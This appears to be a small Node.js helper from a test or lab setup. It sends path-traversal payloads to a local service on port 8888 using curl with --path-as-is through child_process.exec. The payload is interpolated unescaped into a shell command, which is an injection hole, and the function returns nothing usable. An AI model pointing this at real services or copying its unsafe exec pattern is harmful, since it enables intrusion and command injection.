const { exec } = require("child_process");
const path = require('path');  // Ensure path module is imported

function exploitFunction(payload) {
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error executing ${attack_string}: ${error}`);
      return;
    }
    return stdout;
  });
}

module.exports = { exploitFunction };